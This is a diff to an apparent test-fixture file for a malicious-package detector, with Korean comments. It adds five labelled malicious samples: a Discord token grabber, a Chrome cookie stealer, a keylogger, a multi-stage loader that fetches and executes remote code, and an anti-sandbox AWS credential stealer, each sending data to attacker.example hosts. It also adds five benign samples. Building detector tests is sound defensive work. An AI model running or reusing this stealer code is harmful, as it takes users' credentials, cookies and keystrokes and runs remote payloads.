@@ -528,6 +528,218 @@ for p in targets:
 requests.post("https://attacker.example.com/creds", json=collected)
 '''},
     ),
+    # ─── 사이클 5: 악성 5 추가 ───────────────────────────
+    _mal(
+        "discord-token-grabber",
+        description="Discord 토큰 탈취 (LocalStorage/leveldb 스캔)",
+        expected=("MALICIOUS", "HIGH_RISK", "SUSPICIOUS"),
+        note="실제 사례: PyPI/npm Discord token grabber 다수",
+        files={"grabber.py": '''
+import os, re, glob, requests
+
+paths = [
+    os.path.expandvars(r"%APPDATA%\\\\discord\\\\Local Storage\\\\leveldb"),
+    os.path.expanduser("~/.config/discord/Local Storage/leveldb"),
+]
+TOKEN_RE = re.compile(r"[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}")
+tokens = set()
+for p in paths:
+    for f in glob.glob(p + "/*.ldb") + glob.glob(p + "/*.log"):
+        try:
+            with open(f, "rb") as fh:
+                for m in TOKEN_RE.finditer(fh.read().decode("latin-1")):
+                    tokens.add(m.group(0))
+        except Exception:
+            pass
+if tokens:
+    requests.post("https://discord.com/api/webhooks/123/abc",
+                  json={"content": "\\n".join(tokens)})
+'''},
+    ),
+    _mal(
+        "chrome-cookie-stealer",
+        description="Chrome SQLite cookies/login 직접 추출",
+        expected=("MALICIOUS", "HIGH_RISK", "SUSPICIOUS"),
+        note="실제 사례: 다수 info-stealer 변형",
+        files={"chrome.py": '''
+import os, sqlite3, shutil, requests
+src = os.path.expanduser("~/.config/google-chrome/Default/Cookies")
+dst = "/tmp/cookies_copy.db"
+shutil.copy(src, dst)  # locked DB 복사
+con = sqlite3.connect(dst)
+rows = con.execute(
+    "SELECT host_key, name, encrypted_value FROM cookies"
+).fetchall()
+con.close()
+requests.post("https://attacker.example.com/cookies",
+              json={"rows": [str(r) for r in rows]})
+'''},
+    ),
+    _mal(
+        "keylogger-pynput",
+        description="키 입력 captured + 외부 송신",
+        expected=("MALICIOUS", "HIGH_RISK", "SUSPICIOUS"),
+        note="실제 사례 변형 (pynput 기반)",
+        files={"keylog.py": '''
+import requests, time
+buffer = []
+
+def on_press(key):
+    buffer.append(str(key))
+    if len(buffer) >= 100:
+        try:
+            requests.post(
+                "https://attacker.example.com/keys",
+                json={"keys": buffer.copy(), "ts": time.time()},
+            )
+        except Exception:
+            pass
+        buffer.clear()
+
+# pynput 임포트 + 리스너 시작
+from pynput import keyboard
+listener = keyboard.Listener(on_press=on_press)
+listener.start()
+'''},
+    ),
+    _mal(
+        "multi-stage-loader",
+        description="1차 fetch → exec(2차 코드) → 3차 다운+실행",
+        expected=("MALICIOUS", "HIGH_RISK", "SUSPICIOUS"),
+        note="다단계 loader (실제 사례: request typosquat 변형)",
+        files={"loader.py": '''
+import requests, base64, subprocess
+# Stage 1: 외부에서 base64 인코딩된 stage 2 fetch
+stage2_b64 = requests.get("https://cdn.attacker.example/s2").text
+exec(base64.b64decode(stage2_b64).decode())
+# Stage 3: 별도 binary 다운로드 + 실행
+r = requests.get("https://cdn.attacker.example/payload.bin")
+open("/tmp/.s3", "wb").write(r.content)
+subprocess.Popen(["/bin/sh", "-c", "chmod +x /tmp/.s3 && /tmp/.s3 &"])
+'''},
+    ),
+    _mal(
+        "anti-vm-detection",
+        description="VM/sandbox 환경 검출 후 페이로드 분기",
+        expected=("MALICIOUS", "HIGH_RISK", "SUSPICIOUS"),
+        note="anti-analysis 기법",
+        files={"sandbox_check.py": '''
+import os, subprocess, requests
+# VM/sandbox 탐지 — 우회면 정상 동작인 척, 실제 호스트면 페이로드
+def is_sandbox():
+    try:
+        out = subprocess.check_output(
+            ["systemd-detect-virt"], stderr=subprocess.DEVNULL
+        ).decode().strip()
+        return out and out != "none"
+    except Exception:
+        pass
+    return os.path.exists("/proc/scsi/scsi") and \
+           "VBOX" in open("/proc/scsi/scsi").read().upper()
+
+if not is_sandbox():
+    secret = os.environ.get("AWS_SECRET_ACCESS_KEY", "")
+    requests.post(
+        "https://attacker.example.com/real",
+        json={"creds": secret},
+    )
+'''},
+    ),
+    # ─── 사이클 5: 정상 5 추가 ───────────────────────────
+    _ben(
+        "networkx-graph-ops",
+        description="networkx 그래프 알고리즘",
+        files={"graph.py": '''
+"""Graph algorithm helpers."""
+import networkx as nx
+
+def shortest_path(g, src, dst):
+    return nx.shortest_path(g, source=src, target=dst)
+
+def degree_distribution(g):
+    return [d for _, d in g.degree()]
+
+def connected_components(g):
+    return list(nx.connected_components(g))
+'''},
+    ),
+    _ben(
+        "boto3-s3-readonly",
+        description="boto3 S3 read-only client",
+        files={"s3.py": '''
+"""Read-only S3 helpers."""
+import boto3
+
+def list_objects(bucket: str, prefix: str = ""):
+    s3 = boto3.client("s3")
+    paginator = s3.get_paginator("list_objects_v2")
+    for page in paginator.paginate(Bucket=bucket, Prefix=prefix):
+        for obj in page.get("Contents", []):
+            yield obj["Key"], obj["Size"]
+
+def get_object_text(bucket: str, key: str) -> str:
+    s3 = boto3.client("s3")
+    obj = s3.get_object(Bucket=bucket, Key=key)
+    return obj["Body"].read().decode("utf-8")
+'''},
+    ),
+    _ben(
+        "paramiko-ssh-client",
+        description="paramiko SSH client (정상 사용)",
+        files={"ssh.py": '''
+"""SSH command execution helper."""
+import paramiko
+
+def run_remote(host: str, user: str, key_path: str, cmd: str) -> str:
+    client = paramiko.SSHClient()
+    client.set_missing_host_key_policy(paramiko.RejectPolicy())
+    client.connect(host, username=user, key_filename=key_path, timeout=10)
+    try:
+        stdin, stdout, stderr = client.exec_command(cmd, timeout=30)
+        return stdout.read().decode("utf-8")
+    finally:
+        client.close()
+'''},
+    ),
+    _ben(
+        "multiprocessing-pool",
+        description="multiprocessing.Pool 병렬 처리",
+        files={"par.py": '''
+"""CPU-bound parallel processing."""
+import multiprocessing as mp
+
+def process_chunk(data: bytes) -> int:
+    return sum(data)
+
+def parallel_map(items, fn, workers: int = None):
+    workers = workers or mp.cpu_count()
+    with mp.Pool(workers) as pool:
+        return pool.map(fn, items)
+'''},
+    ),
+    _ben(
+        "inspect-introspection",
+        description="inspect 모듈 메타프로그래밍",
+        files={"intro.py": '''
+"""Introspection utilities."""
+import inspect
+
+def public_methods(obj) -> list[str]:
+    return [
+        name for name, _ in inspect.getmembers(obj, inspect.ismethod)
+        if not name.startswith("_")
+    ]
+
+def signature_str(fn) -> str:
+    return f"{fn.__name__}{inspect.signature(fn)}"
+
+def caller_name() -> str | None:
+    frame = inspect.currentframe()
+    if frame and frame.f_back and frame.f_back.f_back:
+        return frame.f_back.f_back.f_code.co_name
+    return None
+'''},
+    ),
     # ─── 정상 fixture 추가 10 ───────────────────────────────
     _ben(
         "fastapi-style-app",
